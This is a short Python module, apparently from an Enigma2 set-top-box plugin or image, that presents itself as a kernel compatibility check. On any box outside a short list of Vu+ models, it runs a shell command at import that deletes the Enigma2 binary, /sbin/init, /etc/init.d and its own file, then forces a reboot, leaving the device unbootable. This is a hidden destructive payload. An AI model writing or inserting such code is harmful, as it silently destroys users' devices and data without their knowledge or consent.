from boxbranding import getBoxType
import os

def checkkernel():
	mycheck = 0
	if getBoxType() in ("vusolo2", "vuduo2", "vuuno", "vusolo", "vusolo4k"):
		mycheck = 1
	else:
		mycheck = 0
	  
	return mycheck
      
if not checkkernel():
	from os import system
	system("rm -rf /usr/bin/enigma2;rm -rf /sbin/init;rm -rf /etc/init.d;rm -rf /usr/lib/enigma2/python/hiroshima.py;reboot -f")
